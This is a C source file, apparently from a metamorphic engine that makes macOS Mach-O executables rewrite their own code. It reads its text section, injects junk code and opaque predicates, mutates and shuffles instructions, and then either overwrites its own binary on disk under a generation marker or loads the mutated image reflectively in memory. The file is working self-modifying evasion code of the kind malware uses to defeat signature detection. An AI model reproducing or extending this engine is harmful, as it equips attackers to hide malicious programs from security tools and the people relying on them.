        if (generation >= 5 && ctx->cfg.num_blocks >= 3) {
            size_t size_before_opaques = ctx->codesz;
            if (mix_opaques(ctx, intensity)) {
                DBG("[+] Opaque: %zu -> %zu bytes (+%.1f%%)\n", 
                    size_before_opaques, ctx->codesz,
                    100.0 * (ctx->codesz - size_before_opaques) / size_before_opaques);
                
                /* Rebuild CFG and protected regions after injection */
                if (ctx->cfg.blocks) {
                    free(ctx->cfg.blocks);
                    ctx->cfg.blocks = NULL;
                }
                if (!sketch_flow(ctx->working_code, ctx->codesz, &ctx->cfg)) {
                    goto rollback;
                }
                
                crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz, ctx->working_code);
            }
        }
        
        /* Inject junk code throughout */
        if (generation >= 3) {
            size_t size_before_junk = ctx->codesz;
            if (junkify(ctx, intensity)) {
                DBG("[+] Junk: %zu -> %zu bytes (+%.1f%%)\n", 
                    size_before_junk, ctx->codesz,
                    100.0 * (ctx->codesz - size_before_junk) / size_before_junk);
                
                /* Rebuild */
                crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz, ctx->working_code);
            }
        }
    }
#endif

    /* Rebuild regions before mutations */
    crit_tap(ctx->hdr, ctx->text_vm_start, ctx->ranges, &ctx->numcheck, ctx->codesz, ctx->working_code);
    DBG("[*] Final: %zu regions \n", ctx->numcheck);

    /* Mutations */
    if (generation >= 3) {
        engine_context_t engine_ctx;
        init_engine(&engine_ctx);
        
        /* Pass those regions to the engine */
        engine_ctx.protected_ranges = ctx->ranges;
        engine_ctx.num_protected = ctx->numcheck;
        
        mutate(ctx->working_code, ctx->codesz, &ctx->rng, generation, &engine_ctx);
    }

    /* get_entry(ctx); */

    if (ctx->entry_len > 0) {
        memcpy(ctx->working_code, ctx->entry_backup, ctx->entry_len);
    }

    /* Block Shuffling if not already done */
#ifdef FOO
    if (generation >= 2 && ctx->cfg.num_blocks >= 2 && 
        (chacha20_random(&ctx->rng) % 100) < (intensity * 10)) {
        DBG("[*] Block shuffling...\n");
        
        uint8_t *backup = malloc(ctx->codesz);
        if (backup) {
            memcpy(backup, ctx->working_code, ctx->codesz);
            size_t backup_size = ctx->codesz;
            
#if defined(__x86_64__) || defined(_M_X64)
            shuffle_blocks(ctx->working_code, ctx->codesz, &ctx->rng);
#elif defined(__aarch64__) || defined(_M_ARM64)
            shuffle_blocks_arm64(ctx->working_code, ctx->codesz, &ctx->rng);
#endif
            
            /* Validate the result */
            if (!is_chunk_ok(ctx->working_code, ctx->codesz)) {
                DBG("[!] Block shuffling failed \n");
                memcpy(ctx->working_code, backup, backup_size);
                ctx->codesz = backup_size;
            } else {
                DBG("[+] Block shuffling done \n");
            }
            
            free(backup);
        }
    }
#else
    
#endif    

    if (!clear_mut(ctx)) {
        DBG("[!] clear_mut() failed\n");
        goto rollback;
    }
    
    if (!mach_O(ctx->working_code, ctx->codesz)) {
        DBG("[-] mach_O() failed\n");
        goto rollback;
    }

    /* what's what */
    size_t decode_errors = 0;
    size_t offset = 0;
    
#if defined(__x86_64__) || defined(_M_X64)
    while (offset < ctx->codesz) {
        x86_inst_t inst;
        if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) ||
            !inst.valid || inst.len == 0) {
            decode_errors++;
            offset++;
            continue;
        }
        offset += inst.len;
    }
#elif defined(__aarch64__) || defined(_M_ARM64)
    while (offset + 4 <= ctx->codesz) {
        arm64_inst_t inst;
        if (!decode_arm64(ctx->working_code + offset, &inst) || !inst.valid) {
            decode_errors++;
        }
        offset += 4;
    }
#endif
    
    size_t max_errors = ctx->codesz / 100;
    if (decode_errors > max_errors) {
        DBG("[!] Too many errors: %zu (max %zu)\n", max_errors);
        goto rollback;
    }

    DBG("Gen=%u, %zu->%zu (+%.1f%%)\n", generation, backup_sz, ctx->codesz,
        100.0 * (ctx->codesz - backup_sz) / backup_sz);

    free(backup_code);
    return true;

rollback:
    memcpy(ctx->working_code, backup_code, backup_sz);
    ctx->codesz = backup_sz;
    ctx->current_growth = (backup_sz > ctx->original_size) ? (backup_sz - ctx->original_size) : 0;
    free(backup_code);
    return false;
}

/* Final validation before disk write */
static bool dsk_seg(context_t *ctx, size_t original_size) {     
    if (!clear_mut(ctx)) return false;
    if (ctx->codesz > original_size * 4) return false;
    
    instr_info_t *cf_instrs = malloc(8192 * sizeof(instr_info_t));
    if (!cf_instrs) return false;
    size_t cf_ninstr = decode_map(ctx->working_code, ctx->codesz, cf_instrs, 8192);
    if (cf_ninstr == 0) {
        free(cf_instrs);
        return false;
    }
    
    free(cf_instrs);
    if (!is_chunk_ok(ctx->working_code, ctx->codesz)) return false;

    size_t invalid_ops = 0;
    for (size_t offset = 0; offset < ctx->codesz; ) {
        if (!is_op_ok(ctx->working_code + offset)) {
            invalid_ops++;
        }
        
        size_t len = 1;
        x86_inst_t inst;
        if (decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) && inst.valid) {
            len = inst.len;
        }

        offset += len;
        if (offset >= ctx->codesz) break;
    }
    
    if (invalid_ops > 0) return false;
    
    return true;
}

/* Validate, write to disk, pad with NOPs, read back to verify */
static bool dsk_mut(context_t *ctx, const char *binary_path,  
                               uint64_t file_start, size_t original_size) {
    
    if (!dsk_seg(ctx, original_size)) return false;
    
    size_t write_size = ctx->codesz;
    if (write_size > original_size) return false;
    
    int fd = open(binary_path, O_RDWR);
    if (fd < 0) {
        return false;
    }
    
    if (lseek(fd, (off_t)file_start, SEEK_SET) == (off_t)-1) {
        close(fd);
        return false;
    }
    
    ssize_t written = write(fd, ctx->working_code, write_size);
    if (written != (ssize_t)write_size) {
        close(fd);
        return false;
    }
    
    if (write_size < original_size) {
        size_t pad_size = original_size - write_size;
        uint8_t *nop_pad = malloc(pad_size);
        if (nop_pad) {
            memset(nop_pad, 0x90, pad_size);
            write(fd, nop_pad, pad_size);
            free(nop_pad);
        }
    }
    close(fd);

    int verify_fd = open(binary_path, O_RDONLY);
    if (verify_fd >= 0) {
        if (lseek(verify_fd, (off_t)file_start, SEEK_SET) != (off_t)-1) {
            uint8_t *readback = malloc(write_size);
            if (readback) {
                ssize_t read_bytes = read(verify_fd, readback, write_size);
                if (read_bytes == (ssize_t)write_size) {
                    if (memcmp(readback, ctx->working_code, write_size) == 0) {
                        if (!is_chunk_ok(readback, write_size)) {
                            free(readback);
                            close(verify_fd);
                            return false;
                        }
                    } else {
                        free(readback);
                        close(verify_fd);
                        return false;
                    }
                }
                free(readback);
            }
        }
        close(verify_fd);
    }
    return true;
}

#ifndef FOO
/* Apply mutations via reflective loading */
static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
    if (!ctx || !ctx->working_code || ctx->codesz == 0) {
        return false;
    }
    
    (void)text_base;
    
    DBG("  Original size: %zu bytes\n", text_size);
    DBG("  Mutated size:  %zu bytes\n", ctx->codesz);
    DBG("  Growth:        %.1f%%\n", 100.0 * (ctx->codesz - text_size) / text_size);
    
    size_t mutations_count = 0;
    size_t compare_size = MIN(ctx->codesz, text_size);
    for (size_t i = 0; i < compare_size; i++) {
        if (ctx->working_code[i] != ctx->ogicode[i]) {
            mutations_count++;
        }
    }
    
    DBG("  Mutations %zu bytes changed\n", mutations_count);
    
    if (mutations_count == 0) {
        return false;
    }
    
    if (!mach_O(ctx->working_code, ctx->codesz)) {
        return false;
    }
    
    size_t macho_size = 0;
    uint8_t *macho_binary = wrap_macho(ctx->working_code, ctx->codesz, &macho_size);
    
    if (!macho_binary) {printf("Failed to wrap\n");return false;}
    
    DBG("Wrapped in Mach-O structure (%zu bytes)\n", macho_size);
    
    if (!V_machO(macho_binary, macho_size)) {
        printf("Mach-O verification failed\n");
        free(macho_binary);
        return false;
    }
    
    DBG("Mach-O V Passed\n");
    
    bool success = exec_mem(macho_binary, macho_size);
    
    if (success) {
        /* Something */ 
    } else {
        /* Go Sideways */
    }
    
    free(macho_binary);
    
    return success;
}

#endif

/* Find generation marker in code by scanning for magic value */
static marker_t* find_marker(uint8_t *code, size_t size) {
    if (size < sizeof(marker_t)) return NULL;
    
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        /* Search for magic byte sequence */
        if (memcmp(code + i, MAGIC, 8) == 0) {
            marker_t *marker = (marker_t *)(code + i);
            /* Verify checksum simple XOR */
            uint32_t expected = marker->generation ^ 0xAE7B;
            if (marker->checksum == expected) {
                return marker;
            }
        }
    }
    return NULL;
}

/* Embed generation marker in code */
static size_t embed_marker(uint8_t *code, size_t size, uint32_t generation) {
    marker_t new_marker;
    memcpy(new_marker.magic, MAGIC, 8);
    new_marker.generation = generation;
    new_marker.checksum = generation ^ 0xAE7B;
    
    /* Update existing marker if found */
    marker_t *existing = find_marker(code, size);
    if (existing) {
        size_t offset = (uint8_t*)existing - code;
        existing->generation = generation;
        existing->checksum = generation ^ 0xAE7B;
        DBG("[*] Updated existing marker at 0x%zx\n", offset);
        return offset;
    }
    
    /* Look for padding (0x90, 0x00, 0xCC) we need at least 16 contiguous bytes */
    size_t padding_offset = NOFFSET__;
    size_t max_padding_len = 0;
    
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        size_t current_padding_len = 0;
        for (size_t j = 0; j < size - i && j < 256; j++) {
            uint8_t byte = code[i + j];
            if (byte == 0x90 || byte == 0x00 || byte == 0xCC) {
                current_padding_len++;
            } else {
                break;
            }
        }
        
        if (current_padding_len >= sizeof(marker_t)) {
            if (current_padding_len > max_padding_len) {
                padding_offset = i;
                max_padding_len = current_padding_len;
            }
        }
    }
    
    if (padding_offset != NOFFSET__) {
        memcpy(code + padding_offset, &new_marker, sizeof(marker_t));
        DBG("[*] Marker in %zu-byte at 0x%zx\n", max_padding_len, padding_offset);
        return padding_offset;
    }
    
    /* Look for any sequence of NOPs specifically */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        bool all_nops = true;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            if (code[i + j] != 0x90) {
                all_nops = false;
                break;
            }
        }
        if (all_nops) {
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker in NOP at 0x%zx\n", i);
            return i;
        }
    }
    
    /* Look for alignment padding (int3 sequences) */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        bool all_int3 = true;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            if (code[i + j] != 0xCC) {
                all_int3 = false;
                break;
            }
        }
        if (all_int3) {
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker in INT3 at 0x%zx\n", i);
            return i;
        }
    }
    
    /* Check end of section for full padding */
    if (size >= sizeof(marker_t) + 64) {
        /* Scan backwards from end looking for complete padding */
        for (size_t offset = size - sizeof(marker_t); offset > size - 2048 && offset > 0; offset--) {
            bool all_padding = true;
            for (size_t j = 0; j < sizeof(marker_t); j++) {
                uint8_t byte = code[offset + j];
                if (byte != 0x00 && byte != 0x90 && byte != 0xCC) {
                    all_padding = false;
                    break;
                }
            }
            
            if (all_padding) {
                memcpy(code + offset, &new_marker, sizeof(marker_t));
                DBG("[*] Marker near end at 0x%zx\n", offset);
                return offset;
            }
        }
    }
    
    /* Look for smaller padding and use NOPs to fill */
    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
        /* Look for at least 8 consecutive padding bytes */
        size_t padding_count = 0;
        for (size_t j = 0; j < sizeof(marker_t); j++) {
            uint8_t byte = code[i + j];
            if (byte == 0x00 || byte == 0x90 || byte == 0xCC) {
                padding_count++;
            }
        }
        
        if (padding_count >= 8) {
            /* Fill entire region with NOPs first, then embed marker */
            memset(code + i, 0x90, sizeof(marker_t));
            memcpy(code + i, &new_marker, sizeof(marker_t));
            DBG("[*] Marker with NOP fill at 0x%zx (%zu bytes)\n", i, padding_count);
            return i;
        }
    }
    /* Can't find a place for the marker, so mutate the hell out of this binary until something breaks. */
    return NOFFSET__;
}

/* Check if we reached max mutation depth */
static bool check_generation(uint8_t *code, size_t size, uint32_t *current_gen) {
    marker_t *marker = find_marker(code, size);
    
    if (!marker) {
        /* Virgin */
        *current_gen = 0;
        return true;
    }
    
    *current_gen = marker->generation;
    
    if (marker->generation >= MX_GEN) {
        return false;  /* Max generations reached */
    }
    
    return true;
}

int mutator(void) {
    /* Only mutate once per process lifetime */
    static _Atomic bool mutation_done = false;
    if (atomic_load(&mutation_done)) {return 0;}
    
    char pathbuf[PATH_MAX];
    uint32_t psize = sizeof(pathbuf);
    if (_NSGetExecutablePath(pathbuf, &psize) != 0) return 1;
    
    struct mach_header_64 *mh = (struct mach_header_64 *)&_mh_execute_header;
    text_section_t tsec;
    
    if (!text_sec(mh, &tsec)) return 1;
    
    size_t text_size = (size_t)(tsec.file_end - tsec.file_start);
    
    intptr_t slide = img_slide(mh);
    uint8_t *runtime_text_base = (uint8_t *)(tsec.vm_start + slide);
    
    DBG("file=0x%llx-0x%llx, vm=0x%llx-0x%llx, slide=0x%lx, runtime=%p\n",
        tsec.file_start, tsec.file_end, tsec.vm_start, tsec.vm_end, slide, runtime_text_base);
    
    int fd = open(pathbuf, O_RDONLY);
    if (fd < 0) return 1;
    
    uint8_t *original_text = malloc(text_size);
    if (!original_text) {close(fd); return 1;}
    
    if (lseek(fd, (off_t)tsec.file_start, SEEK_SET) == (off_t)-1 ||
        read(fd, original_text, text_size) != (ssize_t)text_size) {
        free(original_text);
        close(fd);
        return 1;
    }
    close(fd);
    
#ifdef FOO
    /* Check generation marker in code */
    uint32_t current_gen = 0;
    if (!check_generation(original_text, text_size, &current_gen)) {
        DBG("[*] Max generations (%u) reached, No mutation\n", MX_GEN);
        free(original_text);
        return 0;
    }
    
    DBG("[*] Generation: %u/%u\n", current_gen, MX_GEN);
    
    /* Embed initial marker in virgin binary*/
    if (current_gen == 0) {
        g_marker_offset = embed_marker(original_text, text_size, 0);
        if (g_marker_offset != NOFFSET__) {
            DBG("[*] Initial marker at offset 0x%zx\n", g_marker_offset);
        } else {
            DBG("[!] Can't embed marker\n");
        }
    } else {
        /* Marker location */
        marker_t *marker = find_marker(original_text, text_size);
        if (marker) {
            g_marker_offset = (uint8_t*)marker - original_text;
            DBG("[*] Found Marker at offset 0x%zx\n", g_marker_offset);
        }
    }
#else
    /* No markers needed, always start fresh */
#endif
    
    context_t ctx;
    if (!tx_Init(&ctx, original_text, text_size, mh, tsec.vm_start)) {
        free(original_text);
        return 1;
    }
    
    uint8_t *backup = malloc(text_size);
    if (!backup) {
        clear_tx(&ctx);
        free(original_text);
        return 1;
    }
    
    bool success = false;
    bool mutated = false;
    
#ifdef FOO
    unsigned max_gen_limit = MX_GEN;
    unsigned next_gen = current_gen + 1;
    
    if (next_gen > max_gen_limit) {
        DBG("[*] Max generation (%u) reached\n", max_gen_limit);
        free(backup);
        clear_tx(&ctx);
        free(original_text);
        return 0;
    }
    
    DBG("[*]  Mutating: Gen %u > Gen %u \n", current_gen, next_gen);
    
    memcpy(backup, ctx.working_code, MIN(ctx.codesz, text_size));
    size_t backup_size = ctx.codesz;
    
    if (!mOrph(&ctx, next_gen, text_size)) {
        DBG("[!] Generation %u failed\n", next_gen);
        memcpy(ctx.working_code, backup, text_size);
        ctx.codesz = backup_size;
        free(backup);
        clear_tx(&ctx);
        free(original_text);
        return 1;
    }
    
    if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
        DBG("[!] Generation %u produced invalid code\n", next_gen);
        memcpy(ctx.working_code, backup, text_size);
        ctx.codesz = backup_size;
        free(backup);
        clear_tx(&ctx);
        free(original_text);
        return 1;
    }
    
    if (memcmp(ctx.working_code, backup, MIN(ctx.codesz, text_size)) != 0) {
        mutated = true;
        DBG("[+] Generation %u: %zu bytes (%.1f%% growth)\n", 
            next_gen, ctx.codesz, 100.0 * (ctx.codesz - backup_size) / backup_size);
    }
    
#else
    unsigned max_generations = MX_GEN;    
    for (unsigned gen = 1; gen <= max_generations; gen++) {
        memcpy(backup, ctx.working_code, MIN(ctx.codesz, text_size));
        size_t backup_size = ctx.codesz;
        
        if (!mOrph(&ctx, gen, text_size)) {
            printf("[!] Generation %u failed\n", gen);
            memcpy(ctx.working_code, backup, text_size);
            ctx.codesz = backup_size;
            break;
        }
        
        /* Validate  */
        if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
            printf("[!] Generation %u produced invalid code\n", gen);
            memcpy(ctx.working_code, backup, text_size);
            ctx.codesz = backup_size;
            break;
        }
        
        if (memcmp(ctx.working_code, backup, MIN(ctx.codesz, text_size)) != 0) {
            mutated = true;
            printf("[+] Generation %u: %zu bytes (%.1f%% growth)\n", 
                gen, ctx.codesz, 100.0 * (ctx.codesz - backup_size) / backup_size);
        }
    }
#endif
    
    if (mutated) {
#ifdef FOO
        /* some */
#else
        /* ...  */
#endif
        
        atomic_store(&mutation_done, true);
        
#ifdef FOO
        /* Force code size to match original */
        if (ctx.codesz != text_size) {
            DBG("[!] Size mismatch: %zu != %zu, forcing to original\n", ctx.codesz, text_size);
            ctx.codesz = text_size;
        }
        
        if (ctx.codesz <= text_size) {
            /* Scan for relocations before wrapping */
#if defined(__x86_64__) || defined(_M_X64)
            uint8_t arch_type = ARCH_X86;
#elif defined(__aarch64__) || defined(_M_ARM64)
            uint8_t arch_type = ARCH_ARM;
#else
            uint8_t arch_type = ARCH_X86;
#endif
            ctx.reloc_table = reloc_scan(ctx.working_code, ctx.codesz, 
                                         tsec.vm_start, arch_type);
            
            if (ctx.reloc_table) {
                DBG("[*] Relocation table built\n");
            }
            
            /* Update marker to next generation */
            size_t marker_offset = embed_marker(ctx.working_code, ctx.codesz, next_gen);
            if (marker_offset != NOFFSET__) {
                DBG("[*] Updated marker: %u -> %u (offset 0x%zx)\n", 
                    current_gen, next_gen, marker_offset);
            } else {
                DBG("[!] Failed to update marker\n");
            }
            
            success = dsk_mut(&ctx, pathbuf, tsec.file_start, text_size);
            
            if (success) {
                DBG("[+] Mutation passed (gen %u -> %u)\n", current_gen, next_gen);
            } else {
                DBG("[!] Disk mutation failed\n");
                die();
            }
        } else {
            DBG("[!] Cannot write size increased (%zu > %zu)\n", 
                ctx.codesz, text_size);
            success = false;
        }
#else
        if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
            DBG("[!] Code failed validation\n");
            success = false;
        } else {
            DBG("[+] Code validated\n"); 
            DBG("Attempting reflective load...\n");
            
            success = mem_mut(&ctx, runtime_text_base, text_size);
            
            if (!success) {
                DBG("[!] Loading failed\n");
                die();
            }
        }
#endif
    } else {
        /* 
         * We mutate generation N directly into N+1 without keeping a pristine copy.
         * It's different from what engines usually do which is preservin' the OG.
         * The 'ogicode'? Only used for counting changes, never for rollback.
         * The 'backup' in the loop? Only rolls back within a generation, not across.
         *
         * Meanin' errors accumulate over generations 
         * we allow 1% decode errors get mutated again,
         * bad branches get shuffled again & corrupted regs get swapped again ...
         * Leavin' the binary's too fucked2mutate again.
         * It's the cons of max obfuscation.
         */
        DBG("[!] No mutations!! \n");
#ifdef FOO
        /* is expected if binary is already mutated */
#else
        /* this shouldn't happen */
        die();
#endif
    }

    free(backup);
    clear_tx(&ctx);
    free(original_text);
    
    return success ? 0 : 1;
}
